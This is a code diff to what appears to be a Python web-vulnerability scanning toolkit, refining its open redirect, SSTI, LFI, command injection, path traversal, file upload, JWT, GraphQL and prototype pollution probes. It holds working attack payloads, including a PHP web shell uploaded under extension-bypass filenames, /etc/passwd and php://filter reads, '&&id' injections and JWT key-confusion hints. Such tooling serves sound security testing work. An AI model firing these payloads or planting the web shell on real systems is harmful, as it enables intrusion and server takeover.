@@ -330,11 +330,13 @@ async def _open_redirect_check(args: dict) -> str:
     ]
     project_id = args.get("project_id")
     timeout_s = int(args.get("timeout", 60))
-    params = (args.get("params") or "url,redirect,next,return,returnUrl,goto,dest,destination,redir,target,link").split(",")
+    params = [p.strip() for p in (args.get("params") or "url,redirect,next,return,returnUrl,goto,dest,destination,redir,target,link").split(",") if p.strip()]
+    max_params = int(args.get("max_params", len(params)))  # was hardcoded slice[:5] — now configurable
+    max_payloads = int(args.get("max_payloads", 3))
     results = []
-    for param in params[:5]:
-        for payload in payloads[:3]:
-            test_url = f"{target}?{param.strip()}={payload}"
+    for param in params[:max_params]:
+        for payload in payloads[:max_payloads]:
+            test_url = _build_url_with_param(target, param, payload)  # was: f"{target}?{param}={payload}" — broken on existing-query URLs, payload unencoded
             cmd = ["curl", "-sI", "-m", "10", "--max-redirs", "0", test_url]
             stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
             loc = re.search(r"(?i)^[Ll]ocation:\s*(.+)", stdout, re.MULTILINE)
@@ -342,7 +344,7 @@ async def _open_redirect_check(args: dict) -> str:
                 results.append(f"  [VULN] param={param} payload={payload} → {loc.group(1).strip()}")
     await _persist(project_id, "open_redirect_check", args, "\n".join(results), "", 0)
     if not results:
-        return f"No open redirects found on {target} (tested {len(params[:5])} params)."
+        return f"No open redirects found on {target} (tested {min(len(params), max_params)} params × {min(len(payloads), max_payloads)} payloads)."
     return f"Open redirect findings for {target}:\n" + "\n".join(results)
 
 
@@ -704,20 +706,21 @@ async def _ssti_probe(args: dict) -> str:
         ("*{7*7}", "49"),
         ("{{7*'7'}}", "7777777"),
     ]
-    base_url = target if not param else target
     results = []
     for payload, expected in payloads:
-        encoded = urllib.parse.quote(payload)
         if param:
-            test_url = f"{target}?{param}={encoded}"
+            test_url = _build_url_with_param(target, param, payload)
         else:
-            test_url = f"{target}{encoded}"
+            # Inline payload into URL path (legacy mode); URL-encode the payload
+            test_url = f"{target}{urllib.parse.quote(payload)}"
         cmd = ["curl", "-sL", "-m", "10", test_url]
         stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
         if expected in stdout:
             results.append(f"  [VULN] payload={payload!r} → response contains '{expected}' (SSTI confirmed)")
         else:
-            results.append(f"  [SAFE] payload={payload!r} → '{expected}' not in response")
+            # was [SAFE] — misleading. "Expected not in response" doesn't prove safety;
+            # could be HTML-escaped, in a different template engine, etc.
+            results.append(f"  [NO_MATCH] payload={payload!r} → '{expected}' not in response (not conclusive)")
     summary = f"SSTI probe for {target}:\n" + "\n".join(results)
     await _persist(project_id, "ssti_probe", args, summary, "", 0)
     return summary
@@ -762,17 +765,30 @@ async def _lfi_probe(args: dict) -> str:
         "php://filter/convert.base64-encode/resource=/etc/passwd",
     ]
     results = []
+    confirmed = 0
+    baseline_len = -1
     for payload in payloads:
-        test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
+        test_url = _build_url_with_param(target, param, payload)
         cmd = ["curl", "-sL", "-m", "10", test_url]
         stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
-        if "root:" in stdout or "daemon:" in stdout:
-            results.append(f"  [VULN] {payload!r} → /etc/passwd content in response!")
-        elif len(stdout) > 100:
-            results.append(f"  [CHECK] {payload!r} → response len={len(stdout)} (manual review)")
+        if baseline_len < 0:
+            baseline_len = len(stdout)
+        # Use shared signal detector — catches /etc/passwd, Windows boot.ini, IMDS.
+        signal = _imds_signal(stdout)
+        # php://filter payloads return base64 source — detect those magic prefixes.
+        b64_src = "PD9waHA" in stdout or "PD94bWw" in stdout
+        if signal:
+            results.append(f"  [VULN] {payload!r} → {signal}")
+            confirmed += 1
+        elif b64_src:
+            results.append(f"  [VULN] {payload!r} → base64-encoded source disclosed via php://filter")
+            confirmed += 1
+        elif abs(len(stdout) - baseline_len) > 500:
+            # tighter threshold than 100 bytes; only flag big body-size deltas as worth manual review
+            results.append(f"  [CHECK] {payload!r} → response size differs by {len(stdout) - baseline_len:+d} from baseline (manual review)")
     if not results:
         results.append(f"  No obvious LFI detected for param={param}")
-    summary = f"LFI probe for {target}:\n" + "\n".join(results)
+    summary = f"LFI probe for {target} (param={param}, {confirmed} confirmed):\n" + "\n".join(results)
     await _persist(project_id, "lfi_probe", args, summary, "", 0)
     return summary
 
@@ -945,10 +961,20 @@ async def _cmdi_probe(args: dict) -> str:
         "&&id",
         "||id",
     ]
+    # Establish a baseline latency before injecting — guards against false-positive
+    # "time-based cmdi" on naturally slow endpoints.
+    if param:
+        baseline_url = _build_url_with_param(target, param, "x")
+    else:
+        baseline_url = target
+    b_start = time.time()
+    await _run_subprocess(["curl", "-sL", "-m", "12", baseline_url], timeout=timeout_s)
+    baseline_elapsed = time.time() - b_start
+
     results = []
     for payload in payloads:
         if param:
-            test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
+            test_url = _build_url_with_param(target, param, payload)
         else:
             test_url = f"{target}{urllib.parse.quote(payload)}"
         start = time.time()
@@ -957,10 +983,11 @@ async def _cmdi_probe(args: dict) -> str:
         elapsed = time.time() - start
         if "uid=" in stdout and "gid=" in stdout:
             results.append(f"  [VULN] {payload!r} → id command output in response!")
-        elif elapsed > 4.5 and "sleep" in payload:
-            results.append(f"  [VULN] {payload!r} → time delay {elapsed:.1f}s (blind cmdi)")
+        elif elapsed > baseline_elapsed + 4.0 and "sleep" in payload:
+            # Compare to BASELINE, not absolute — slow endpoints no longer trigger false positives.
+            results.append(f"  [VULN] {payload!r} → time delay {elapsed:.1f}s vs baseline {baseline_elapsed:.1f}s (blind cmdi)")
         else:
-            results.append(f"  [OK] {payload!r} → no indicator (elapsed={elapsed:.1f}s)")
+            results.append(f"  [OK] {payload!r} → no indicator (elapsed={elapsed:.1f}s, baseline={baseline_elapsed:.1f}s)")
     summary = f"CMDi probe for {target}:\n" + "\n".join(results)
     await _persist(project_id, "cmdi_probe", args, summary, "", 0)
     return summary
@@ -1006,15 +1033,24 @@ async def _path_traversal(args: dict) -> str:
         "....//....//....//etc/passwd",
     ]
     results = []
+    confirmed = 0
     for payload in payloads:
-        test_url = f"{target}?{param}={urllib.parse.quote(payload)}"
+        test_url = _build_url_with_param(target, param, payload)
         cmd = ["curl", "-sL", "-m", "10", test_url]
         stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
-        if "root:" in stdout or "[extensions]" in stdout:
-            results.append(f"  [VULN] {payload!r} → file content in response!")
+        # Broadened detection: shared _imds_signal handles /etc/passwd + Windows boot.ini.
+        # Also explicitly checks win.ini headers.
+        signal = _imds_signal(stdout)
+        win_ini = any(k in stdout for k in ("[extensions]", "[fonts]", "[mci extensions]", "for 16-bit app support"))
+        if signal:
+            results.append(f"  [VULN] {payload!r} → {signal}")
+            confirmed += 1
+        elif win_ini:
+            results.append(f"  [VULN] {payload!r} → Windows win.ini content disclosed")
+            confirmed += 1
         else:
             results.append(f"  [OK] {payload!r}")
-    summary = f"Path traversal probe for {target} (param={param}):\n" + "\n".join(results)
+    summary = f"Path traversal probe for {target} (param={param}, {confirmed} confirmed):\n" + "\n".join(results)
     await _persist(project_id, "path_traversal", args, summary, "", 0)
     return summary
 
@@ -1048,7 +1084,7 @@ async def _file_upload_check(args: dict) -> str:
         return "Error: target (upload endpoint URL) is required."
     field = (args.get("field") or "file").strip()
     project_id = args.get("project_id")
-    timeout_s = int(args.get("timeout", 60))
+    timeout_s = int(args.get("timeout", 60))  # was parsed and ignored — now honoured below
     # Test uploads: PHP shell, PHP with different extensions, null byte
     tests = [
         ("shell.php", "application/octet-stream", "<?php system($_GET['cmd']); ?>"),
@@ -1056,11 +1092,15 @@ async def _file_upload_check(args: dict) -> str:
         ("shell.pHp", "application/octet-stream", "<?php system($_GET['cmd']); ?>"),
         ("shell.php%00.jpg", "image/jpeg", "<?php system($_GET['cmd']); ?>"),
     ]
+    # Tie curl's -m and asyncio timeout to the user-supplied timeout_s, with
+    # sensible per-request cap so a single hung request doesn't eat the whole turn.
+    per_request_s = max(10, min(timeout_s, 60))
     results = []
     for filename, ct, content in tests:
         cmd = [
-            "curl", "-sL", "-m", "15", "-X", "POST",
+            "curl", "-sL", "-m", str(per_request_s), "-X", "POST",
             "-F", f"{field}=@-;filename={filename};type={ct}",
+            "-w", "\nHTTP_CODE:%{http_code}",
             target,
         ]
         proc = await asyncio.create_subprocess_exec(
@@ -1071,7 +1111,7 @@ async def _file_upload_check(args: dict) -> str:
         )
         try:
             stdout_b, stderr_b = await asyncio.wait_for(
-                proc.communicate(input=content.encode()), timeout=20
+                proc.communicate(input=content.encode()), timeout=per_request_s + 5
             )
         except asyncio.TimeoutError:
             proc.kill()
@@ -1079,8 +1119,18 @@ async def _file_upload_check(args: dict) -> str:
             results.append(f"  {filename} → TIMEOUT")
             continue
         resp = stdout_b.decode(errors="replace")
-        results.append(f"  {filename} → rc={proc.returncode} response_len={len(resp)}")
+        code_m = re.search(r"HTTP_CODE:(\d+)\s*$", resp)
+        code = code_m.group(1) if code_m else "?"
+        # 2xx + body that looks like a JSON success path or "uploaded" keyword =
+        # stronger signal than just response_len.
+        success_hint = ""
+        if code.startswith("2"):
+            lower = resp.lower()
+            if any(k in lower for k in ("success", "uploaded", "filename", "url\":", "path\":")):
+                success_hint = " [LIKELY ACCEPTED — try fetching the uploaded path]"
+        results.append(f"  {filename} → HTTP {code} response_len={len(resp)}{success_hint}")
     summary = f"File upload check for {target} (field={field}):\n" + "\n".join(results)
+    summary += "\n\nNote: this tool only tests whether the server ACCEPTS the upload, not whether the file is executable. Manually fetch the returned URL (or guess /uploads/<filename>) and confirm code execution."
     await _persist(project_id, "file_upload_check", args, summary, "", 0)
     return summary
 
@@ -1223,17 +1273,30 @@ async def _jwt_decode(args: dict) -> str:
             return f"<decode error: {e}>"
     header = b64_decode(parts[0])
     payload = b64_decode(parts[1])
+    # `json.dumps` raises TypeError on the "<decode error: …>" sentinel string
+    # returned by b64_decode failure paths, so render via repr() when not a dict.
+    def render(obj):
+        if isinstance(obj, dict) or isinstance(obj, list):
+            return json.dumps(obj, indent=2)
+        return repr(obj)
     lines = [
         "JWT Decoded (no signature verification):",
-        f"Header:  {json.dumps(header, indent=2)}",
-        f"Payload: {json.dumps(payload, indent=2)}",
+        f"Header:  {render(header)}",
+        f"Payload: {render(payload)}",
         f"Signature: {parts[2][:30]}...",
     ]
-    alg = header.get("alg", "") if isinstance(header, dict) else ""
-    if alg.lower() == "none":
-        lines.append("[VULN] Algorithm is 'none' — signature not verified!")
-    elif alg.upper() in ("HS256", "HS384", "HS512"):
-        lines.append(f"[NOTE] HMAC algorithm {alg} — consider jwt_crack for weak secrets.")
+    # Guard against header being a non-dict (decode error). `.get` would AttributeError.
+    if isinstance(header, dict):
+        alg = header.get("alg", "")
+        if isinstance(alg, str):
+            if alg.lower() == "none":
+                lines.append("[VULN] Algorithm is 'none' — signature not verified!")
+            elif alg.upper() in ("HS256", "HS384", "HS512"):
+                lines.append(f"[NOTE] HMAC algorithm {alg} — consider jwt_crack for weak secrets.")
+            elif alg.upper().startswith(("RS", "ES", "PS")):
+                lines.append(f"[NOTE] Asymmetric algorithm {alg} — not wordlist-crackable; try alg=none confusion or RS→HS key confusion attack.")
+    else:
+        lines.append(f"[WARN] header could not be parsed as JSON dict: {header!r}")
     return "\n".join(lines)
 
 
@@ -1462,16 +1525,25 @@ async def _graphql_probe(args: dict) -> str:
             "curl", "-sL", "-m", "10", "-X", "POST",
             "-H", "Content-Type: application/json",
             "-d", introspection_query, url,
+            "-w", "\nHTTP_CODE:%{http_code}",
         ]
         if cookies:
             cmd += ["-H", f"Cookie: {cookies}"]
         stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
-        if "__schema" in stdout or "queryType" in stdout:
-            results.append(f"  [VULN] {url} → Introspection ENABLED! Schema exposed.")
-        elif "errors" in stdout.lower() or rc == 0:
-            results.append(f"  [EXISTS] {url} → GraphQL endpoint responds (introspection disabled or partial)")
+        # Use the actual HTTP status code, not `rc == 0` which always succeeds for any
+        # response (including 404). Previously every probed endpoint reported [EXISTS].
+        code_m = re.search(r"HTTP_CODE:(\d+)\s*$", stdout)
+        code = code_m.group(1) if code_m else "?"
+        if "__schema" in stdout or '"queryType"' in stdout:
+            results.append(f"  [VULN] {url} → HTTP {code} — Introspection ENABLED! Schema exposed.")
+        elif code in ("200", "400") and "errors" in stdout.lower():
+            # 200 with GraphQL-shaped error response = endpoint exists but introspection blocked.
+            # 400 with errors[] body = same.
+            results.append(f"  [EXISTS] {url} → HTTP {code} GraphQL endpoint responds (introspection disabled or restricted)")
+        elif code in ("404", "405"):
+            results.append(f"  [404] {url} → HTTP {code}")
         else:
-            results.append(f"  [404] {url}")
+            results.append(f"  [?]  {url} → HTTP {code} (not a GraphQL response shape)")
     summary = f"GraphQL probe for {base}:\n" + "\n".join(results)
     await _persist(project_id, "graphql_probe", args, summary, "", 0)
     return summary
@@ -1871,13 +1943,23 @@ async def _prototype_pollution(args: dict) -> str:
             results.append(f"  [VULN] payload={payload[:50]!r} → 'polluted' reflected in response!")
         else:
             results.append(f"  [OK] payload={payload[:50]!r} → rc={rc} len={len(stdout)}")
-    # Also check GET params
-    get_payloads = ["?__proto__[polluted]=yes", "?constructor[prototype][polluted]=yes"]
-    for gp in get_payloads:
-        cmd = ["curl", "-sL", "-m", "10", f"{target}{gp}"]
+    # Also check GET params — use the parser-aware URL builder so we don't
+    # produce malformed URLs when target already has a query string.
+    get_pollutions = [
+        ("__proto__[polluted]", "yes"),
+        ("constructor[prototype][polluted]", "yes"),
+    ]
+    for k, v in get_pollutions:
+        test_url = _build_url_with_param(target, k, v)
+        cmd = ["curl", "-sL", "-m", "10", test_url]
         stdout, stderr, rc = await _run_subprocess(cmd, timeout=timeout_s)
         if "polluted" in stdout:
-            results.append(f"  [VULN] GET {gp!r} → 'polluted' in response!")
+            results.append(f"  [VULN] GET {k}={v} → 'polluted' in response!")
+    results.append(
+        "\nNote: confirmed prototype pollution may not reflect the literal 'polluted' string. "
+        "If the response shape suggests JS framework use, follow up by probing default-property "
+        "endpoints (e.g. /api/user without auth) for behavioural changes after the POST."
+    )
     summary = f"Prototype pollution test for {target}:\n" + "\n".join(results)
     await _persist(project_id, "prototype_pollution", args, summary, "", 0)
     return summary
